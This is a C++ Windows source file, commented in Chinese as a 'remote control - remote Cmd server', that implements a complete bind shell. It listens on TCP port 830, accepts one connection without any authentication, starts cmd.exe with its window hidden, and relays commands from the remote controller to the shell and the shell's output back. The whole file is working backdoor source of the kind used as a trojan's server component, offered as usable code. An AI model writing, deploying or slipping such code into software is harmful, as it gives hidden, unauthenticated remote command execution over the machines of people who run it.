/*
  This project was created and edited using the MFC SelfBanner AppWizard.

  Comment: 远程控制－远程Cmd服务端.

  Project: test.
  Author : dhyao
  Date   : 星期一, 二月 02, 2009
*/
// ntCmdServer.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"Ws2_32")


#define BUFFER_SIZE 1024


void ShellSession(SOCKET master_sock, char *lpShellName)
{
	char dataBuffer[BUFFER_SIZE];
	DWORD lBytesRead, ret;
	SECURITY_ATTRIBUTES sa;
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	HANDLE hShellWrite = NULL, hReadPipe = NULL;
	HANDLE hShellRead = NULL, hWritePipe = NULL;
	struct timeval tv;
	fd_set readfds;

	tv.tv_sec = 0; 
	tv.tv_usec = 100000;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//双管道，以便完成父子进程之间的双向通信
	//创建管道一：
	if (!CreatePipe(&hReadPipe, &hShellWrite, &sa, 0))
	{
		goto session_error;
	}
	//创建管道二：
	if (!CreatePipe(&hShellRead, &hWritePipe, &sa, 0))
	{
		goto session_error;
	}

	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//隐藏CMD窗口
	si.wShowWindow = SW_HIDE;
	//将来自于管道服务器的数据作为CMD的标准输入
	si.hStdInput = hShellRead;
	//将CMD标准输出以及错误定向（输出，写）到管道服务器
	si.hStdOutput = hShellWrite;
	si.hStdError = hShellWrite;

	//以预先设置的参数创建CMD进程
	if (!CreateProcess(lpShellName, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		goto session_error;

	while (1)
	{
		//检查CMD是否有数据输出
		if (!PeekNamedPipe(hReadPipe, dataBuffer, 1, &lBytesRead, NULL, NULL))
		{
			printf("PeekNamedPipe() 失败");// GetLastError()
			break;
		}
		//若有数据，则lBytesRead大于0，因此调用ReadFile将数据从管道中读出
		if (lBytesRead > 0)
		{
			if (!ReadFile(hReadPipe, dataBuffer, BUFFER_SIZE, &lBytesRead, NULL))
				break;

			//读到数据后，将其发送到远程的主控端
			ret = send(master_sock, dataBuffer, lBytesRead, 0);

			if (ret == 0 || ret == SOCKET_ERROR)
				break;
		}
		else//若管道中无数据可读
		{
			
			ret = WaitForSingleObject(pi.hProcess, 0);

			if (ret == WAIT_OBJECT_0)
				break;

			FD_ZERO(&readfds);
			FD_SET(master_sock, &readfds);
			//则等待接收来自主控端的命令数据
			ret = select(0, &readfds, NULL, NULL, &tv);

			if (ret == SOCKET_ERROR)
				break;

			if (!FD_ISSET(master_sock, &readfds))
				continue;
			//若从主控端接收到命令后，则通过管道二将其发送给CMD
			ret = recv(master_sock, dataBuffer, BUFFER_SIZE, 0);

			if (ret == 0 || ret == SOCKET_ERROR)
				break;

			if (!WriteFile(hWritePipe, dataBuffer, ret, &lBytesRead, NULL))
				break;
		}
	}

	TerminateProcess(pi.hProcess, 0);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

session_error:
	closesocket(master_sock);
	CloseHandle(hReadPipe);
	CloseHandle(hShellWrite);
	CloseHandle(hShellRead);
	CloseHandle(hWritePipe);
}



DWORD WINAPI CmdShellThread(LPVOID lpParam)
{
	char cmd[MAX_PATH];
	SOCKET master_sock = (SOCKET)lpParam;

	GetEnvironmentVariable("ComSpec", cmd, MAX_PATH);
	//创建CMD会话
	ShellSession(master_sock, cmd);

	return 0;
}


int main(int argc, char* argv[])
{
	WSADATA ws;
	SOCKET listenFD;
	int ret;
	//初始化wsa
	WSAStartup(MAKEWORD(2,2),&ws);
	//建立socket
	listenFD = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	//监听本机830端口
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(830);
	server.sin_addr.s_addr=ADDR_ANY;
	ret=bind(listenFD,(sockaddr *)&server,sizeof(server));
	ret=listen(listenFD,2);
	//如果客户请求830端口，接受连接
	int iAddrSize = sizeof(server);
	SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);
	
	
	SOCKET master_sock=clientFD;
	LPTHREAD_START_ROUTINE lpStartAddress=CmdShellThread;
	HANDLE hThread;
	DWORD dwThreadId;
	//创建工作线程
	hThread = CreateThread(NULL, 0, lpStartAddress, (LPVOID)master_sock, 0, &dwThreadId);

	if (hThread == NULL)
	{
		closesocket(master_sock);
		return -1;
	}

	//等待线程结束
	ret=WaitForSingleObject(hThread,INFINITE);

	CloseHandle(hThread);
	
	return 0;
}

